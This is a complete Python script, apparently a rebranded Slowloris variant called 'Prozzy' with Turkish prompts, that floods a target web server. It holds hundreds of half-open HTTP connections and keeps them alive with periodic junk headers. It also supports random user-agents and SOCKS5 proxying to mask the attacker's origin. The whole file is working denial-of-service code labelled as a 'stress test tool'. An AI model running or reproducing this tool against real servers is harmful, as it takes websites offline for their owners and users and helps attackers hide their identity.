#!/usr/bin/env python3
import argparse
import logging
import random
import socket
import sys
import time
import os
import re

def set_terminal_properties():
    os.system('color 5')  # Set terminal text color

set_terminal_properties()

from colorama import init, Fore

init()

ascii_art = f"""
{Fore.RED}                                  
██████╗ ██████╗  ██████╗ ███████╗███████╗██╗   ██╗
██╔══██╗██╔══██╗██╔═══██╗╚══███╔╝╚══███╔╝╚██╗ ██╔╝
██████╔╝██████╔╝██║   ██║  ███╔╝   ███╔╝  ╚████╔╝ 
██╔═══╝ ██╔══██╗██║   ██║ ███╔╝   ███╔╝    ╚██╔╝  
██║     ██║  ██║╚██████╔╝███████╗███████╗   ██║   
╚═╝     ╚═╝  ╚═╝ ╚═════╝ ╚══════╝╚══════╝   ╚═╝   
{Fore.RESET}
"""

print(ascii_art)

def is_valid_ipv4(address):
    pattern = r'^(\d{1,3}\.){3}\d{1,3}$'
    if re.match(pattern, address):
        return all(0 <= int(part) < 256 for part in address.split('.'))
    return False

def get_ip():
    ip = input("Lütfen hedef IPv4 adresini girin: ")
    while not is_valid_ipv4(ip):
        print("Hata: Geçersiz IP adresi. Lütfen geçerli bir IPv4 adresi girin.")
        ip = input("Lütfen hedef IPv4 adresini girin: ")
    return ip

parser = argparse.ArgumentParser(
    description="Prozzy, low bandwidth stress test tool for websites"
)
parser.add_argument("host", nargs="?", help="Host to perform stress test on")
parser.add_argument(
    "-p", "--port", default=80, help="Port of webserver, usually 80", type=int
)
parser.add_argument(
    "-v",
    "--verbose",
    dest="verbose",
    action="store_true",
    help="Increases logging",
)
parser.add_argument(
    "-ua",
    "--randuseragents",
    dest="randuseragent",
    action="store_true",
    help="Randomizes user-agents with each request",
)
parser.add_argument(
    "-x",
    "--useproxy",
    dest="useproxy",
    action="store_true",
    help="Use a SOCKS5 proxy for connecting",
)
parser.add_argument(
    "--proxy-host", default="127.0.0.1", help="SOCKS5 proxy host"
)
parser.add_argument(
    "--proxy-port", default="8080", help="SOCKS5 proxy port", type=int
)
parser.add_argument(
    "--https",
    dest="https",
    action="store_true",
    help="Use HTTPS for the requests",
)
parser.add_argument(
    "--sleeptime",
    dest="sleeptime",
    default=15,
    type=int,
    help="Time to sleep between each header sent.",
)
parser.set_defaults(verbose=False)
parser.set_defaults(randuseragent=False)
parser.set_defaults(useproxy=False)
parser.set_defaults(https=False)
args = parser.parse_args()

# Prompt for host if not provided
if not args.host:
    args.host = get_ip()

# Prompt for socket count
args.sockets = int(input("Lütfen kullanmak istediğiniz socket sayısını (100-500 arası) girin: "))
while not (100 <= args.sockets <= 500):
    print("Hata: Socket sayısı 100 ile 500 arasında olmalıdır.")
    args.sockets = int(input("Lütfen kullanmak istediğiniz socket sayısını (100-500 arası) girin: "))

# Proxy handling and logging setup remains unchanged
if args.useproxy:
    try:
        import socks
        socks.setdefaultproxy(
            socks.PROXY_TYPE_SOCKS5, args.proxy_host, args.proxy_port
        )
        socket.socket = socks.socksocket
        logging.info("Using SOCKS5 proxy for connecting...")
    except ImportError:
        logging.error("Socks Proxy Library Not Available!")
        sys.exit(1)

logging.basicConfig(
    format="[%(asctime)s] %(message)s",
    datefmt="%d-%m-%Y %H:%M:%S",
    level=logging.DEBUG if args.verbose else logging.INFO,
)

def send_line(self, line):
    line = f"{line}\r\n"
    self.send(line.encode("utf-8"))

def send_header(self, name, value):
    self.send_line(f"{name}: {value}")

if args.https:
    logging.info("Importing ssl module")
    import ssl
    setattr(ssl.SSLSocket, "send_line", send_line)
    setattr(ssl.SSLSocket, "send_header", send_header)

setattr(socket.socket, "send_line", send_line)
setattr(socket.socket, "send_header", send_header)

user_agents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3",
    "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; Trident/7.0; AS;rv:11.0) like Gecko",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 10_0 like Mac OS X) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Mobile/14E5239e Safari/602.1.50",
]

def init_socket(ip):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(4)
    s.connect((ip, args.port))

    if args.https:
        ctx = ssl.create_default_context()
        s = ctx.wrap_socket(s, server_hostname=args.host)

    s.send_line(f"GET /?{random.randint(0, 2000)} HTTP/1.1")

    if args.randuseragent:
        s.send_header("User-Agent", random.choice(user_agents))
    else:
        s.send_header("User-Agent", user_agents[0])
    s.send_header("Accept-language", "en-US,en,q=0.5")
    return s

def main():
    ip = args.host
    socket_count = args.sockets
    logging.info("Flooding %s:%s with %s sockets.", ip, args.port, socket_count)

    socket_list = []
    for _ in range(socket_count):
        try:
            logging.debug("Creating socket nr %s", _)
            s = init_socket(ip)
        except socket.error as e:
            logging.debug(e)
            break
        socket_list.append(s)

    while True:
        logging.info(
            "Sending keep-alive headers... Socket count: %s",
            len(socket_list),
        )
        for s in list(socket_list):
            try:
                s.send_header("X-a", random.randint(1, 5000))
            except socket.error:
                socket_list.remove(s)

        for _ in range(socket_count - len(socket_list)):
            logging.debug("Recreating socket...")
            try:
                s = init_socket(ip)
                if not s:
                    continue
                socket_list.append(s)
            except socket.error as e:
                logging.debug("Recreating socket failed")
                break
        time.sleep(args.sleeptime)

if __name__ == "__main__":
    main()